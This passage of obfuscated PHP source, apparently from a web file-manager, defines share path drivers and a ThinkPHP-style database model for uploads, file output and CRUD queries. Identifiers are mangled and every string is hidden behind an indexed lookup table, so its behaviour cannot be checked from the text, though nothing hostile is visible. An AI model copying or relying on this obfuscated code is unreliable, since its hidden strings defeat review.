IO::copy($âê¡»ıİ[$_SERVER[ä¿÷‹µ±][84]], $şÊ¿œ‰ı, !1, $ÂÁı•£€); return $Ø™ûÔêñ; } public function setModifyTime($™šĞÚñÍ, $çâò÷àŒ = '') { $ĞıÏÌŸÃ =& $_SERVER[ä¿÷‹µ±]; if (!$™šĞÚñÍ) { return; } $this->model->where(array($ĞıÏÌŸÃ[417] => $™šĞÚñÍ))->save(array($ĞıÏÌŸÃ[85] => $çâò÷àŒ)); } public function upload($†­ÏÒ•, $É­ãÙùğ, $Š‚£®Ë = false, $††²çñÇ = REPEAT_REPLACE) { $É‚Úìš =& $_SERVER[ä¿÷‹µ±]; $À“™‹”æ = $this->parse($†­ÏÒ•); $ùè¢‚¿° = $this->model->addFile($À“™‹”æ[$É‚Úìš[399]], $É­ãÙùğ, $À“™‹”æ[$É‚Úìš[84]], $Š‚£®Ë, $††²çñÇ); return $this->getPathOuter($ùè¢‚¿°); } public function uploadFileByID($¹ùó€…§, $Ïá÷´, $Ö³µçñÏ) { $í‰ÌòìÃ =& $_SERVER[ä¿÷‹µ±]; $éäş†Ùß = $this->parse($¹ùó€…§); $¨ŒÇïòë = $this->model->addFileByFileID($éäş†Ùß[$í‰ÌòìÃ[399]], $Ïá÷´, $éäş†Ùß[$í‰ÌòìÃ[84]], $Ö³µçñÏ); return $this->getPathOuter($¨ŒÇïòë); } public function addFileByRemote($ÜÒë÷ë, $‰Ô­×ëá, $Š•äµö¹ = array(), $àÉÏ¦Çó = '', $˜äÄéé¬) { $ºÇ²íá =& $_SERVER[ä¿÷‹µ±]; $Ÿ·‹ê»Á = $this->parse($ÜÒë÷ë); $àÉÏ¦Çó = empty($àÉÏ¦Çó) ? $Ÿ·‹ê»Á[$ºÇ²íá[84]] : $àÉÏ¦Çó; $£İÔ¡³˜ = $this->model->addFileByRemote($Ÿ·‹ê»Á[$ºÇ²íá[399]], $‰Ô­×ëá, $àÉÏ¦Çó, $Š•äµö¹, $˜äÄéé¬); return $this->getPathOuter($£İÔ¡³˜); } public function uploadLink($î¿•Ëì°, $Ş‚–•œ = 0) { $–÷Ææ¡ô =& $_SERVER[ä¿÷‹µ±]; $Û´ßò¿€ = $this->parse($î¿•Ëì°); $¶Âí£ˆ˜ = _get($GLOBALS[$–÷Ææ¡ô[7]], $–÷Ææ¡ô[1351]); $Ä« î»¿ = _get($GLOBALS[$–÷Ææ¡ô[7]], $–÷Ææ¡ô[1352]); $î¿•Ëì° = Model($–÷Ææ¡ô[609])->createFileName($Û´ßò¿€[$–÷Ææ¡ô[84]], $¶Âí£ˆ˜, $Ä« î»¿); return IO::uploadLink($î¿•Ëì°, $Ş‚–•œ); } public function fileNameAuto($˜Š¹ùüç, $‡¸ÓŸ, $îèŒ· = REPEAT_REPLACE, $Ïé¥ÒŸâ = false) { return $this->model->fileNameAuto($˜Š¹ùüç, $‡¸ÓŸ, $îèŒ·, $Ïé¥ÒŸâ); } public function fileNameExist($¡·×Ú, $¸ÛÍàÏ“) { return $this->model->fileNameExist($¡·×Ú, $¸ÛÍàÏ“); } protected function _fileOut($ôßÛ¢Æ, $«ÉìüîÍ = false, $µò…’¤¶ = false, $¢ ‡ïÕ = '', $ø•„¸Ñ = false) { $ëÊ«ûßÒ =& $_SERVER[ä¿÷‹µ±]; $˜¢¹¬º™ = $this->model->sourceInfo($ôßÛ¢Æ); if ($˜¢¹¬º™[$ëÊ«ûßÒ[410]] == $ëÊ«ûßÒ[88]) { header($ëÊ«ûßÒ[1353]); die; } $€™à¡Œ = $this->model->fileInfoGet($ôßÛ¢Æ); $¢ ‡ïÕ = $€™à¡Œ[$ëÊ«ûßÒ[176]] ? $€™à¡Œ[$ëÊ«ûßÒ[176]] : $¢ ‡ïÕ; $Î¦÷¾­ñ = isset($GLOBALS[$ëÊ«ûßÒ[1354]]) ? $GLOBALS[$ëÊ«ûßÒ[1354]] : $˜¢¹¬º™[$ëÊ«ûßÒ[32]]; if ($ø•„¸Ñ) { return IO::fileOutServer($€™à¡Œ[$ëÊ«ûßÒ[84]], $«ÉìüîÍ, $Î¦÷¾­ñ, $¢ ‡ïÕ); } IO::fileOut($€™à¡Œ[$ëÊ«ûßÒ[84]], $«ÉìüîÍ, $Î¦÷¾­ñ, $¢ ‡ïÕ); } public function fileOut($¡¯×²„ª, $ìĞÕŒ‹’ = false, $Í©õ’Ó = false, $¸û Ÿòƒ = '') { $this->_fileOut($¡¯×²„ª, $ìĞÕŒ‹’, $Í©õ’Ó, $¸û Ÿòƒ); } public function fileOutServer($ş¼Ãéòı, $£Ú®æ‰… = false, $£¥Šúæ = false, $‘Î½Ç„ = '') { $this->_fileOut($ş¼Ãéòı, $£Ú®æ‰…, $£¥Šúæ, $‘Î½Ç„, !0); } protected function _fileOutImage($²± ‡É¹, $‹Ë˜Ö‰å = 250) { $Ó¬·Öõş =& $_SERVER[ä¿÷‹µ±]; $Ú¹óå°Ô = $this->model->pathInfo($²± ‡É¹); if ($Ú¹óå°Ô[$Ó¬·Öõş[410]] == $Ó¬·Öõş[88]) { show_json($Ó¬·Öõş[1355] . $²± ‡É¹, !1); } $‹®ÏÅ•ü = $this->model->fileInfoGet($²± ‡É¹); $‹®ÏÅ•ü[$Ó¬·Öõş[32]] = $Ú¹óå°Ô[$Ó¬·Öõş[32]]; $‹®ÏÅ•ü[$Ó¬·Öõş[169]] = $Ú¹óå°Ô[$Ó¬·Öõş[169]]; $GLOBALS[$Ó¬·Öõş[1354]] = $‹®ÏÅ•ü[$Ó¬·Öõş[32]]; $GLOBALS[$Ó¬·Öõş[168]] = $‹®ÏÅ•ü; IO::fileOutImage($‹®ÏÅ•ü[$Ó¬·Öõş[84]], $‹Ë˜Ö‰å); } public function fileOutImage($»èã‡Ü—, $úŞ×³­§ = 250) { $this->_fileOutImage($»èã‡Ü—, $úŞ×³­§); } public function fileOutImageServer($–§ÊÖ§, $èÉÃ’ƒ = 250) { $this->_fileOutImage($–§ÊÖ§, $èÉÃ’ƒ); } public function link($ËÜ£ù, $‚·‰Ñ›í = '') { $·ó€×ğ­ = $this->model->fileInfoGet($ËÜ£ù); return IO::link($·ó€×ğ­[$_SERVER[ä¿÷‹µ±][84]], $‚·‰Ñ›í); } protected function parse($Ÿ«è•¬±) { $£¡Éãêº =& $_SERVER[ä¿÷‹µ±]; if (strstr($Ÿ«è•¬±, $£¡Éãêº[8]) === !1) { return array($£¡Éãêº[419] => intval($Ÿ«è•¬±), $£¡Éãêº[84] => $£¡Éãêº[12], $£¡Éãêº[1350] => array()); } $Ú­æŠƒ = explode($£¡Éãêº[8], trim($Ÿ«è•¬±, $£¡Éãêº[8])); if (count($Ú­æŠƒ) < 2) { show_tips(clear_html($Ÿ«è•¬±) . $£¡Éãêº[1356]); } return array($£¡Éãêº[419] => intval($Ú­æŠƒ[0]), $£¡Éãêº[84] => $Ú­æŠƒ[1], $£¡Éãêº[1350] => array_slice($Ú­æŠƒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($²È†ïˆÚ) { $this->pathParse = $²È†ïˆÚ; $this->model = Model($_SERVER[ä¿÷‹µ±][1349]); } public function getPathOuter($½ß†ûş) { $¯İËõë‚ =& $_SERVER[ä¿÷‹µ±]; if (!$½ß†ûş) { return $½ß†ûş; } $ÈÂÓÁĞ¨ = $this->parse($½ß†ûş); return trim(KodIO::makeShare($this->pathParse[$¯İËõë‚[399]], $ÈÂÓÁĞ¨[$¯İËõë‚[399]]), $¯İËõë‚[8]); } protected function infoParse($õ¾¼ã·¦, $¥ìÕîõ = false, $‚°æ‰Èæ = false) { $Û¬ŸÚ•³ =& $_SERVER[ä¿÷‹µ±]; $ìßëªŞ  = $this->pathParse[$Û¬ŸÚ•³[399]]; $¾é¦—¡ì = trim($this->pathParse[$Û¬ŸÚ•³[1191]], $Û¬ŸÚ•³[8]); return Action($Û¬ŸÚ•³[1357])->sharePathInfo($ìßëªŞ , $¾é¦—¡ì, $¥ìÕîõ); } public function infoFull($¸¦ĞÅ„) { $÷‚ş€» =& $_SERVER[ä¿÷‹µ±]; $¶“ƒ¡é› = explode($÷‚ş€»[8], trim($¸¦ĞÅ„, $÷‚ş€»[8])); if (count($¶“ƒ¡é›) > 1) { $Èùí÷­ï = implode($÷‚ş€»[8], array_splice($¶“ƒ¡é›, 1)); $’ê­Â¦˜ = $this->model->pathInfoByPath($¶“ƒ¡é›[0], $Èùí÷­ï); if (!$’ê­Â¦˜) { return !1; } $this->pathParse[$÷‚ş€»[1191]] = $’ê­Â¦˜[$÷‚ş€»[402]]; } return $this->infoParse($¸¦ĞÅ„); } public function listAll($³£ÂÕªæ) { $³˜·ˆêù =& $_SERVER[ä¿÷‹µ±]; $ú¶Â˜ıË = IO::info($this->pathParse[$³˜·ˆêù[84]]); if (!$ú¶Â˜ıË) { return array(); } $ß¦õ£ª = $this->model->listAll($³£ÂÕªæ); $ãÎÍÕß = Model($³˜·ˆêù[601])->getInfo($ú¶Â˜ıË[$³˜·ˆêù[489]]); $¯ë³‚§û = Action($³˜·ˆêù[1357]); foreach ($ß¦õ£ª as &$ªõÚ¡©ì) { check_abort(); $ªõÚ¡©ì[$³˜·ˆêù[86]] = $¯ë³‚§û->_shareItemeParse($ªõÚ¡©ì[$³˜·ˆêù[86]], $ãÎÍÕß); } unset($ªõÚ¡©ì); return $ß¦õ£ª; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ş§¹ÖÈø) { $this->pathParse = $ş§¹ÖÈø; $this->model = Model($_SERVER[ä¿÷‹µ±][1349]); } protected function infoParse($•ªùÊ³, $´‰’¨µ = false, $Ï³ã“ = false) { $Îò‹ò›· =& $_SERVER[ä¿÷‹µ±]; return Action($Îò‹ò›·[1197])->sharePathInfo($this->pathParse[$Îò‹ò›·[84]], !0, $´‰’¨µ); } public function listPath($£Ã×‰Ş», $ø‡ ²Ô = false) { $Ì¡¨šÈØ =& $_SERVER[ä¿÷‹µ±]; $—»à×– = parent::listPath($£Ã×‰Ş», $ø‡ ²Ô); if (!$—»à×–) { return $—»à×–; } if (is_array($—»à×–[$Ì¡¨šÈØ[1358]])) { $—»à×–[$Ì¡¨šÈØ[1358]] = Action($Ì¡¨šÈØ[1197])->shareItemInfo($—»à×–[$Ì¡¨šÈØ[1358]]); } foreach ($—»à×– as $ÂŞØ´ÑÉ => $Ãõ—¾šİ) { if (!in_array($ÂŞØ´ÑÉ, array($Ì¡¨šÈØ[83], $Ì¡¨šÈØ[82]))) { continue; } foreach ($Ãõ—¾šİ as $ê€ö°™ù => $ÒæÆ¯½) { $—»à×–[$ÂŞØ´ÑÉ][$ê€ö°™ù] = Action($Ì¡¨šÈØ[1197])->shareItemInfo($ÒæÆ¯½); } } return $—»à×–; } public function listAll($Ÿ¢¼°Üà) { $èã¤ù„• =& $_SERVER[ä¿÷‹µ±]; $åÓÌÊÛ = IO::info($this->pathParse[$èã¤ù„•[84]]); if (!$åÓÌÊÛ) { return array(); } $Ñúù… = $this->model->listAll($Ÿ¢¼°Üà); foreach ($Ñúù… as &$š—é¯­ñ) { $š—é¯­ñ[$èã¤ù„•[86]] = Action($èã¤ù„•[1197])->shareItemInfo($š—é¯­ñ[$èã¤ù„•[86]]); } unset($š—é¯­ñ); return $Ñúù…; } } goto b­ïí·ÁÃğ; Aõ‘¥¬†ŠÀ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\x72\x64\x65\162", "\x61\x6c\151\x61\x73", "\x68\141\x76\x69\x6e\x67", "\x67\162\x6f\165\160", "\x6c\157\x63\x6b", "\x64\151\x73\164\x69\156\143\x74", "\x61\x75\164\x6f", "\146\x69\x6c\x74\145\x72", "\166\x61\x6c\x69\x64\141\x74\145", "\x72\145\x73\165\154\164", "\x62\x69\156\x64", "\x74\157\153\x65\156"); public function __construct($˜ó·À¢¥ = '', $±ĞÁµû = '', $óÏÇ¬ß„ = '') { $‹õ‘‹  =& $_SERVER[ä¿÷‹µ±]; $this->_initialize(); if (!empty($˜ó·À¢¥)) { if (strpos($˜ó·À¢¥, $‹õ‘‹ [10])) { list($this->dbName, $this->name) = explode($‹õ‘‹ [10], $˜ó·À¢¥); } else { $this->name = $˜ó·À¢¥; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($±ĞÁµû)) { $this->tablePrefix = $‹õ‘‹ [12]; } elseif ($‹õ‘‹ [12] != $±ĞÁµû) { $this->tablePrefix = $±ĞÁµû; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($‹õ‘‹ [244]); } $this->db(0, empty($this->connection) ? $óÏÇ¬ß„ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ù½Ø¬± =& $_SERVER[ä¿÷‹µ±]; if (empty($this->fields)) { if (think_config($Ù½Ø¬±[245])) { $€ŠŞŞåà = $this->dbName ? $this->dbName : think_config($Ù½Ø¬±[246]); $Í³èã = think_var_cache($Ù½Ø¬±[247] . strtolower(get_path_this($€ŠŞŞåà) . $Ù½Ø¬±[10] . $this->name)); if ($Í³èã) { $ğ´ç¦õí = think_config($Ù½Ø¬±[248]); if (empty($ğ´ç¦õí) || $Í³èã[$Ù½Ø¬±[249]] == $ğ´ç¦õí) { $this->fields = $Í³èã; return; } } } $this->flush(); } } public function flush() { $£œ¹„–æ =& $_SERVER[ä¿÷‹µ±]; $this->db->setModel($this->name); $àÕ÷ÒŒî = $this->db->getFields($this->getTableName()); if (!$àÕ÷ÒŒî) { return !1; } $this->fields = array_keys($àÕ÷ÒŒî); $this->fields[$£œ¹„–æ[250]] = !1; foreach ($àÕ÷ÒŒî as $ô®ã¥¿ı => $¹ò’©£Ï) { $êÕ»‡­£[$ô®ã¥¿ı] = $¹ò’©£Ï[$£œ¹„–æ[33]]; if ($¹ò’©£Ï[$£œ¹„–æ[39]]) { $this->fields[$£œ¹„–æ[251]] = $ô®ã¥¿ı; if ($¹ò’©£Ï[$£œ¹„–æ[42]]) { $this->fields[$£œ¹„–æ[250]] = !0; } } } $this->fields[$£œ¹„–æ[252]] = $êÕ»‡­£; if (think_config($£œ¹„–æ[248])) { $this->fields[$£œ¹„–æ[249]] = think_config($£œ¹„–æ[248]); } if (think_config($£œ¹„–æ[245])) { $¾¤ì‰ãë = $this->dbName ? $this->dbName : think_config($£œ¹„–æ[246]); think_var_cache($£œ¹„–æ[247] . strtolower(get_path_this($¾¤ì‰ãë) . $£œ¹„–æ[10] . $this->name), $this->fields); } } public function switchModel($Ãâ¶‘ìñ, $…äãŸêÈ = array()) { $ôÊ‹ı®¬ =& $_SERVER[ä¿÷‹µ±]; $½š£›Õ£ = ucwords(strtolower($Ãâ¶‘ìñ)) . $ôÊ‹ı®¬[253]; if (!class_exists($½š£›Õ£)) { think_exception($½š£›Õ£ . think_lang($ôÊ‹ı®¬[254])); } $this->_extModel = new $½š£›Õ£($this->name); if (!empty($…äãŸêÈ)) { foreach ($…äãŸêÈ as $•¡òÈ ) { $this->_extModel->setProperty($•¡òÈ , $this->{$•¡òÈ }); } } return $this->_extModel; } public function __set($Şó¬·Éí, $ÌÛ‰¹¯°) { $this->data[$Şó¬·Éí] = $ÌÛ‰¹¯°; } public function __get($È­‚ÉÔİ) { return isset($this->data[$È­‚ÉÔİ]) ? $this->data[$È­‚ÉÔİ] : null; } public function __isset($¡Šåó¶Ò) { return isset($this->data[$¡Šåó¶Ò]); } public function __unset($ş®ğŸ¶Ş) { unset($this->data[$ş®ğŸ¶Ş]); } public function __call($ËÛĞÔŒ„, $±‡Õ‡®ó) { $ºáÆûÉ =& $_SERVER[ä¿÷‹µ±]; if (in_array(strtolower($ËÛĞÔŒ„), $this->methods, !0)) { $this->options[strtolower($ËÛĞÔŒ„)] = $±‡Õ‡®ó[0]; return $this; } elseif (in_array(strtolower($ËÛĞÔŒ„), array($ºáÆûÉ[255], $ºáÆûÉ[256], $ºáÆûÉ[257], $ºáÆûÉ[258], $ºáÆûÉ[259]), !0)) { $õƒ¨¿Ø¶ = isset($±‡Õ‡®ó[0]) ? $±‡Õ‡®ó[0] : $ºáÆûÉ[188]; $õƒ¨¿Ø¶ = $this->db->parseKey($õƒ¨¿Ø¶); return $this->getField(strtoupper($ËÛĞÔŒ„) . $ºáÆûÉ[260] . $õƒ¨¿Ø¶ . $ºáÆûÉ[261] . $ËÛĞÔŒ„, $ºáÆûÉ[255]); } elseif (strtolower(substr($ËÛĞÔŒ„, 0, 5)) == $ºáÆûÉ[262]) { $õƒ¨¿Ø¶ = think_parse_name(substr($ËÛĞÔŒ„, 5)); $ó€òŞİÄ[$õƒ¨¿Ø¶] = $±‡Õ‡®ó[0]; return $this->where($ó€òŞİÄ)->find(); } elseif (strtolower(substr($ËÛĞÔŒ„, 0, 10)) == $ºáÆûÉ[263]) { $­Œ‰ö’ë = think_parse_name(substr($ËÛĞÔŒ„, 10)); $ó€òŞİÄ[$­Œ‰ö’ë] = $±‡Õ‡®ó[0]; return $this->where($ó€òŞİÄ)->getField($±‡Õ‡®ó[1]); } elseif (isset($this->_scope[$ËÛĞÔŒ„])) { return $this->scope($ËÛĞÔŒ„, $±‡Õ‡®ó[0]); } elseif (method_exists($this, $ËÛĞÔŒ„)) { array_unshift($±‡Õ‡®ó, $ËÛĞÔŒ„); return call_user_func_array(array($this, $ºáÆûÉ[264]), $±‡Õ‡®ó); } else { return call_user_func_array(array(parent, $ËÛĞÔŒ„), $±‡Õ‡®ó); } } protected function call() { $º‡ãêùã =& $_SERVER[ä¿÷‹µ±]; $üúÁş•ä = func_get_args(); $”Éëğè½ = array_shift($üúÁş•ä); $öéÎÄí = $”Éëğè½; if (is_array($”Éëğè½)) { $öéÎÄí = $”Éëğè½[1]; $”Éëğè½ = $”Éëğè½[0]; } $—†àÏ“à = count($üúÁş•ä) - 1; if (isset($üúÁş•ä[$—†àÏ“à]) && $üúÁş•ä[$—†àÏ“à] === $”Éëğè½) { think_exception(__CLASS__ . $º‡ãêùã[4] . $”Éëğè½ . think_lang($º‡ãêùã[265])); return; } $üúÁş•ä[] = $”Éëğè½; if (method_exists($this, $º‡ãêùã[266])) { $¼Ç³–óö = call_user_func_array(array($this, $º‡ãêùã[267]), array($öéÎÄí, $üúÁş•ä)); if (!is_null($¼Ç³–óö) && $¼Ç³–óö !== !1) { return $¼Ç³–óö; } } $¼”óàéÅ = call_user_func_array(array($this, $”Éëğè½), $üúÁş•ä); if (method_exists($this, $º‡ãêùã[268])) { $¼Ç³–óö = call_user_func_array(array($this, $º‡ãêùã[269]), array($öéÎÄí, $üúÁş•ä, $¼”óàéÅ)); if ($¼Ç³–óö) { return $¼Ç³–óö; } } return $¼”óàéÅ; } protected function _initialize() { } protected function _facade($ş×’ªÄ™) { $˜Åù›ÆÒ =& $_SERVER[ä¿÷‹µ±]; if (!empty($this->fields)) { foreach ($ş×’ªÄ™ as $¢«íÍáÀ => $È™æ„çò) { if (is_array($this->fields) && !in_array($¢«íÍáÀ, $this->fields, !0)) { unset($ş×’ªÄ™[$¢«íÍáÀ]); } elseif (is_scalar($È™æ„çò)) { $this->_parseType($ş×’ªÄ™, $¢«íÍáÀ); } } } if (!empty($this->options[$˜Åù›ÆÒ[270]])) { $ş×’ªÄ™ = array_map($this->options[$˜Åù›ÆÒ[270]], $ş×’ªÄ™); unset($this->options[$˜Åù›ÆÒ[270]]); } $this->_beforeWrite($ş×’ªÄ™); return $ş×’ªÄ™; } protected function _beforeWrite(&$øªı÷—“) { } public function add($¼µ‹š = '', $ÄõéÍ¡Ò = array(), $”Òóò™î = false) { if (empty($¼µ‹š)) { if (!empty($this->data)) { $¼µ‹š = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ä¿÷‹µ±][271]); return !1; } } $ÄõéÍ¡Ò = $this->_parseOptions($ÄõéÍ¡Ò); $¼µ‹š = $this->_facade($¼µ‹š); if (!1 === $this->_beforeInsert($¼µ‹š, $ÄõéÍ¡Ò)) { return !1; } $¿˜è‡‹¢ = $this->db->insert($¼µ‹š, $ÄõéÍ¡Ò, $”Òóò™î); if (!1 !== $¿˜è‡‹¢) { $¯ëÓÛËÚ = $this->getLastInsID(); if ($¯ëÓÛËÚ) { $¼µ‹š[$this->getPk()] = $¯ëÓÛËÚ; $this->_after_insert($¼µ‹š, $ÄõéÍ¡Ò); return $¯ëÓÛËÚ; } $this->_after_insert($¼µ‹š, $ÄõéÍ¡Ò); } return $¿˜è‡‹¢; } protected function _beforeInsert(&$„İ–Ìñ¥, $œ¥õ·ã) { } protected function _after_insert($ÇµÛü¯‰, $±Š±Æ) { } public function addAll($£¦³Ãüï, $…—ÁŸì = array(), $ßå±’ù¢ = false) { $ç‚è»ÒÑ =& $_SERVER[ä¿÷‹µ±]; if (empty($£¦³Ãüï)) { $this->error = think_lang($ç‚è»ÒÑ[271]); return !1; } $…—ÁŸì = $this->_parseOptions($…—ÁŸì); foreach ($£¦³Ãüï as $Áˆ¦Îèß => $ƒäû½Á³) { $£¦³Ãüï[$Áˆ¦Îèß] = $this->_facade($ƒäû½Á³); } if (method_exists($this->db, $ç‚è»ÒÑ[272])) { $›ù¹Íıß = $this->db->insertAll($£¦³Ãüï, $…—ÁŸì, $ßå±’ù¢); } else { $this->startTrans(); foreach ($£¦³Ãüï as $Áˆ¦Îèß => $ƒäû½Á³) { $›ù¹Íıß = $this->db->insert($ƒäû½Á³, $…—ÁŸì, $ßå±’ù¢); } $this->commit(); } if (!1 !== $›ù¹Íıß) { $ÙÅ“â¼ = $this->getLastInsID(); if ($ÙÅ“â¼) { return $ÙÅ“â¼; } } return $›ù¹Íıß; } public function selectAdd($ÍëæÀà = '', $áİŸŸÏ = '', $œÆÓÈÊ = array()) { $‘œ……Ş =& $_SERVER[ä¿÷‹µ±]; $œÆÓÈÊ = $this->_parseOptions($œÆÓÈÊ); if (!1 === ($ñ°ş¡Ôö = $this->db->selectInsert($ÍëæÀà ? $ÍëæÀà : $œÆÓÈÊ[$‘œ……Ş[273]], $áİŸŸÏ ? $áİŸŸÏ : $this->getTableName(), $œÆÓÈÊ))) { $this->error = think_lang($‘œ……Ş[274]); return !1; } else { return $ñ°ş¡Ôö; } } public function save($×ö‹Â = '', $¯±€ô¨à = array()) { $É“àÃÌø =& $_SERVER[ä¿÷‹µ±]; if (empty($×ö‹Â)) { if (!empty($this->data)) { $×ö‹Â = $this->data; $this->data = array(); } else { $this->error = think_lang($É“àÃÌø[271]); return !1; } } $×ö‹Â = $this->_facade($×ö‹Â); $¯±€ô¨à = $this->_parseOptions($¯±€ô¨à); $ÑşÜøÎÁ = $this->getPk(); if (!isset($¯±€ô¨à[$É“àÃÌø[275]])) { if (isset($×ö‹Â[$ÑşÜøÎÁ])) { $ÕŠÅÇÜé[$ÑşÜøÎÁ] = $×ö‹Â[$ÑşÜøÎÁ]; $¯±€ô¨à[$É“àÃÌø[275]] = $ÕŠÅÇÜé; unset($×ö‹Â[$ÑşÜøÎÁ]); } else { $this->error = think_lang($É“àÃÌø[274]); return !1; } } if (is_array($¯±€ô¨à[$É“àÃÌø[275]]) && isset($¯±€ô¨à[$É“àÃÌø[275]][$ÑşÜøÎÁ])) { $°Ù¨ñ‡û = $¯±€ô¨à[$É“àÃÌø[275]][$ÑşÜøÎÁ]; } if (!1 === $this->_beforeUpdate($×ö‹Â, $¯±€ô¨à)) { return !1; } $ÜşíŸää = $this->db->update($×ö‹Â, $¯±€ô¨à); if (!1 !== $ÜşíŸää) { if (isset($°Ù¨ñ‡û)) { $×ö‹Â[$ÑşÜøÎÁ] = $°Ù¨ñ‡û; } $this->_afterUpdate($×ö‹Â, $¯±€ô¨à); } return $ÜşíŸää; } protected function _beforeUpdate(&$ùŸ³¡àß, $’¦—Ë‘ù) { } protected function _afterUpdate($ñ¨‡òÉø, $ˆõĞ¡³) { } public function delete($©İë•… = array()) { $²±Ş·€ =& $_SERVER[ä¿÷‹µ±]; if (empty($©İë•…) && empty($this->options[$²±Ş·€[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ò±¹åßè = $this->getPk(); if (is_numeric($©İë•…) || is_string($©İë•…)) { if (strpos($©İë•…, $²±Ş·€[50])) { $üŠóÍŒñ[$Ò±¹åßè] = array($²±Ş·€[276], $©İë•…); } else { $üŠóÍŒñ[$Ò±¹åßè] = $©İë•…; } $this->options[$²±Ş·€[275]] = $üŠóÍŒñ; } $©İë•… = $this->_parseOptions(); if (is_array($©İë•…[$²±Ş·€[275]]) && isset($©İë•…[$²±Ş·€[275]][$Ò±¹åßè])) { $ú¸äåÆã = $©İë•…[$²±Ş·€[275]][$Ò±¹åßè]; } $Ò›Ô¼¢Ï = $this->db->delete($©İë•…); if (!1 !== $Ò›Ô¼¢Ï) { $†ñÉà±¤ = array(); if (isset($ú¸äåÆã)) { $†ñÉà±¤[$Ò±¹åßè] = $ú¸äåÆã; } $this->_after_delete($†ñÉà±¤, $©İë•…); } return $Ò›Ô¼¢Ï; } protected function _after_delete($àëó“î, $ääÚ‘¨ô) { } public function select($‚Ïåä„ƒ = array()) { $©«™Ïì =& $_SERVER[ä¿÷‹µ±]; if (is_string($‚Ïåä„ƒ) || is_numeric($‚Ïåä„ƒ)) { $®¬Ì…È¶ = $this->getPk(); if (strpos($‚Ïåä„ƒ, $©«™Ïì[50])) { $Èü¿×ö [$®¬Ì…È¶] = array($©«™Ïì[276], $‚Ïåä„ƒ); } else { $Èü¿×ö [$®¬Ì…È¶] = $‚Ïåä„ƒ; } $this->options[$©«™Ïì[275]] = $Èü¿×ö ; } elseif (!1 === $‚Ïåä„ƒ) { $‚Ïåä„ƒ = $this->_parseOptions(); return $©«™Ïì[277] . $this->db->buildSelectSql($‚Ïåä„ƒ) . $©«™Ïì[278]; } $‚Ïåä„ƒ = $this->_parseOptions(); $«Ááä‹ = $this->db->select($‚Ïåä„ƒ); if (!1 === $«Ááä‹) { return !1; } if (empty($«Ááä‹)) { return null; } $this->_afterSelect($«Ááä‹, $‚Ïåä„ƒ); return $«Ááä‹; } protected function _afterSelect(&$ò„í€‡Š, $Å½«‹…) { } public function buildSql($Ü¸ÏçÅ = array()) { $¾Œß†×û =& $_SERVER[ä¿÷‹µ±]; $Ü¸ÏçÅ = $this->_parseOptions($Ü¸ÏçÅ); return $¾Œß†×û[277] . $this->db->buildSelectSql($Ü¸ÏçÅ) . $¾Œß†×û[278]; } public function optionsValue($€ü×‘å÷ = null) { if (is_null($€ü×‘å÷)) { return $this->options; } elseif (is_array($€ü×‘å÷)) { $this->options = array_merge($this->options, $€ü×‘å÷); } } protected function _parseOptions($¶ÃÙùÕæ = array()) { $ÅµÁş†Õ =& $_SERVER[ä¿÷‹µ±]; if (is_array($¶ÃÙùÕæ)) { $¶ÃÙùÕæ = array_merge($this->options, $¶ÃÙùÕæ); } $this->options = array(); if (!isset($¶ÃÙùÕæ[$ÅµÁş†Õ[279]])) { $¶ÃÙùÕæ[$ÅµÁş†Õ[279]] = $this->getTableName(); $ÕùêÙò = $this->fields; } else { $ÕùêÙò = $this->getDbFields(); } if (!empty($¶ÃÙùÕæ[$ÅµÁş†Õ[280]])) { $¶ÃÙùÕæ[$ÅµÁş†Õ[279]] .= $ÅµÁş†Õ[53] . $¶ÃÙùÕæ[$ÅµÁş†Õ[280]]; } $¶ÃÙùÕæ[$ÅµÁş†Õ[281]] = $this->name; if (isset($¶ÃÙùÕæ[$ÅµÁş†Õ[275]]) && is_array($¶ÃÙùÕæ[$ÅµÁş†Õ[275]]) && !empty($ÕùêÙò) && !isset($¶ÃÙùÕæ[$ÅµÁş†Õ[282]]) && !isset($¶ÃÙùÕæ[$ÅµÁş†Õ[279]])) { foreach ($¶ÃÙùÕæ[$ÅµÁş†Õ[275]] as $±Šß‚ => $§¯ºŠ°‰) { $±Šß‚ = trim($±Šß‚); if (in_array($±Šß‚, $ÕùêÙò, !0)) { if (is_scalar($§¯ºŠ°‰)) { $this->_parseType($¶ÃÙùÕæ[$ÅµÁş†Õ[275]], $±Šß‚); } } elseif (!is_numeric($±Šß‚) && $ÅµÁş†Õ[11] != substr($±Šß‚, 0, 1) && !1 === strpos($±Šß‚, $ÅµÁş†Õ[10]) && !1 === strpos($±Šß‚, $ÅµÁş†Õ[260]) && !1 === strpos($±Šß‚, $ÅµÁş†Õ[283]) && !1 === strpos($±Šß‚, $ÅµÁş†Õ[284])) { unset($¶ÃÙùÕæ[$ÅµÁş†Õ[275]][$±Šß‚]); } } } $this->_options_filter($¶ÃÙùÕæ); return $¶ÃÙùÕæ; } protected function _options_filter(&$’ÁöÇÔ¬) { } protected function _parseType(&$´‘ıù½ç, $ß±‹ö…Ü) { $ëÇáßğá =& $_SERVER[ä¿÷‹µ±]; if (empty($this->options[$ëÇáßğá[285]][$ëÇáßğá[4] . $ß±‹ö…Ü])) { $ ¯Äìßª = strtolower($this->fields[$ëÇáßğá[252]][$ß±‹ö…Ü]); if (!1 !== strpos($ ¯Äìßª, $ëÇáßğá[286])) { } elseif (!1 === strpos($ ¯Äìßª, $ëÇáßğá[287]) && !1 !== strpos($ ¯Äìßª, $ëÇáßğá[288])) { $´‘ıù½ç[$ß±‹ö…Ü] = intval($´‘ıù½ç[$ß±‹ö…Ü]); } elseif (!1 !== strpos($ ¯Äìßª, $ëÇáßğá[289]) || !1 !== strpos($ ¯Äìßª, 